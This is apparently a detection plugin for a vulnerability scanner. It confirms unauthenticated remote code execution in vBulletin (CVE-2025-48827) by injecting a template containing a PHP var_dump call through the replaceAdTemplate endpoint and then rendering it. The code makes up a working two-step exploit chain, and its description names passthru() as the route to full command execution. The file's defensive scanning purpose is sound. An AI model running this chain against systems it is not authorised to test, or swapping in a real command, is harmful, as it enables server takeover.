"""Agent implementation for detecting vBulletin RCE CVE-2025-48827."""

import datetime
import logging
import re
import secrets  # For cryptographically secure random strings
import string
from urllib.parse import urljoin

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

# --- CVE-2025-48827 Specific Constants ---
VULNERABILITY_TITLE = (
    "vBulletin Unauthenticated RCE via ajax/api/ad/replaceAdTemplate (CVE-2025-48827)"
)
VULNERABILITY_REFERENCE = (
    "CVE-2025-48827, CVE-2025-48828"  # Referencing both as per Nuclei
)
VULNERABILITY_DESCRIPTION = (
    "vBulletin versions 5.0.0 through 5.7.5 and 6.0.0 through 6.0.3 are vulnerable to "
    "Remote Code Execution (RCE). The flaw exists in the ajax/api/ad/replaceAdTemplate endpoint, "
    "where improper use of PHP's Reflection API (especially on PHP 8.1+) allows unauthenticated "
    "attackers to invoke protected controller methods. Attackers can inject a crafted vBulletin "
    "template (e.g., using <vb:if>) containing arbitrary PHP code (like var_dump() or passthru() "
    "for RCE) via the 'template' parameter. A subsequent request to ajax/render/ad_<location> "
    "triggers the execution of this injected code, leading to RCE as the webserver user."
)
RECOMMENDATION = (
    "Upgrade vBulletin to version 6.0.4 or later. Apply all available security patches from vBulletin "
    "for older supported versions. Implement Web Application Firewall (WAF) rules to block "
    "malicious requests targeting 'ajax/api/ad/replaceAdTemplate' and 'ajax/render/ad_'. "
    "Monitor server logs for exploitation attempts. Consider disabling ad management temporarily if patching is delayed."
)
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=15)

# Paths and parameters
VBULLETIN_ROOT_PATH = "/"
REPLACE_AD_ROUTE = "ajax/api/ad/replaceAdTemplate"
RENDER_AD_ROUTE_PREFIX = "ajax/render/ad_"

RAND_STRING_LENGTH = 8
RAND_VALUE_LENGTH = 8

# Expected output pattern for var_dump("random_value") -> string(len) "random_value"
# e.g., string(8) "abcdefgh"
SUCCESS_PATTERN_TEMPLATE = r'string\({length}\) "{value}"'

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def _generate_random_alnum(length: int) -> str:
    """Generates a random alphanumeric string of a given length."""
    return "".join(
        secrets.choice(string.ascii_letters + string.digits) for _ in range(length)
    )


@exploits_registry.register
class VbulletinReplaceAdRceExploit(definitions.Exploit):
    """CVE-2025-48827: vBulletin Unauthenticated RCE in replaceAdTemplate."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        recommendation=RECOMMENDATION,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Checks if the target is vBulletin.
        """

        try:
            response = self.session.get(
                target.origin, timeout=DEFAULT_TIMEOUT.seconds, allow_redirects=True
            )
            if (
                response.status_code == 200
                and 'content="vBulletin' in response.text
                and re.search(r"vbulletin-core\.js", response.text.lower()) is not None
            ):
                logger.info(
                    "Target %s: Found potential vBulletin indicators. Accepting for check.",
                    target.origin,
                )
                return True
            logger.info(
                "Target %s: Did not find strong vBulletin indicators on root page. Accepting with low confidence or relying on check.",
                target.origin,
            )
            return False
        except requests_exceptions.RequestException as e:
            logger.warning(
                "Accept: Request to target %s failed: %s. Accepting tentatively.",
                target.origin,
                e,
            )
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Attempts to exploit the RCE on vBulletin targets.
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        base_url = target.origin

        rand_location_suffix = _generate_random_alnum(RAND_STRING_LENGTH)
        rand_value_to_dump = _generate_random_alnum(RAND_VALUE_LENGTH)

        php_code_for_condition = f'var_dump(\\"{rand_value_to_dump}\\")'
        template_payload = f"<vb:if condition='{php_code_for_condition}'></vb:if>"

        expected_pattern = re.compile(
            SUCCESS_PATTERN_TEMPLATE.format(
                length=len(rand_value_to_dump), value=re.escape(rand_value_to_dump)
            )
        )

        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        inject_url = urljoin(base_url, VBULLETIN_ROOT_PATH)
        inject_data = {
            "routestring": REPLACE_AD_ROUTE,
            "styleid": "1",
            "location": rand_location_suffix,
            "template": template_payload,
        }
        logger.info(
            "Check: Attempting to inject template at %s for location '%s' on %s",
            REPLACE_AD_ROUTE,
            rand_location_suffix,
            target.origin,
        )

        try:
            response_inject = self.session.post(
                inject_url,
                data=inject_data,
                headers=headers,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            logger.debug(
                "Inject request to %s status: %s",
                inject_url,
                response_inject.status_code,
            )

            if (
                response_inject.status_code == 200
                and expected_pattern.search(response_inject.text) is not None
            ):
                logger.critical(
                    "VULNERABILITY CONFIRMED (Stage 1): CVE-2025-48827 on %s. "
                    "Injected template for location '%s' and output found in inject response.",
                    target.origin,
                    rand_location_suffix,
                )
                vulnerabilities.append(self.create_vulnerability(target=target))
                return vulnerabilities
            elif response_inject.status_code != 200:
                logger.warning(
                    "Check: Template injection request to %s failed with status %s. Cannot proceed.",
                    REPLACE_AD_ROUTE,
                    response_inject.status_code,
                )
                return vulnerabilities

            # If not found in first response, proceed to Step 2: Trigger the render
            render_route = f"{RENDER_AD_ROUTE_PREFIX}{rand_location_suffix}"
            render_url = urljoin(base_url, VBULLETIN_ROOT_PATH)
            render_data = {"routestring": render_route}

            logger.info(
                "Check: Attempting to trigger render at %s for location '%s' on %s",
                render_route,
                rand_location_suffix,
                target.origin,
            )
            response_render = self.session.post(
                render_url,
                data=render_data,
                headers=headers,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            logger.debug(
                "Render request to %s status: %s",
                render_url,
                response_render.status_code,
            )

            if response_render.status_code == 200:
                if expected_pattern.search(response_render.text) is not None:
                    logger.critical(
                        "VULNERABILITY CONFIRMED (Stage 2): CVE-2025-48827 on %s. "
                        "Rendered ad for location '%s' and executed code.",
                        target.origin,
                        rand_location_suffix,
                    )
                    vulnerabilities.append(self.create_vulnerability(target=target))
                else:
                    logger.warning(
                        "Check: Render request to %s on %s was successful (200 OK) "
                        "but the output string ('%s') not found in response. Exploitation likely failed.",
                        render_route,
                        target.origin,
                        rand_value_to_dump,
                    )
            else:
                logger.warning(
                    "Check: Render request to %s on %s failed with status %s.",
                    render_route,
                    target.origin,
                    response_render.status_code,
                )

        except requests_exceptions.Timeout:
            logger.warning(
                "Check: Request timeout during exploit attempt for CVE-2025-48827 on %s.",
                target.origin,
            )
        except requests_exceptions.ConnectionError:
            logger.warning(
                "Check: Connection error during exploit attempt for CVE-2025-48827 on %s.",
                target.origin,
            )
        except requests_exceptions.RequestException as e:
            logger.error(
                "Check: An unexpected HTTP request error occurred for CVE-2025-48827 on %s: %s",
                target.origin,
                e,
            )

        return vulnerabilities
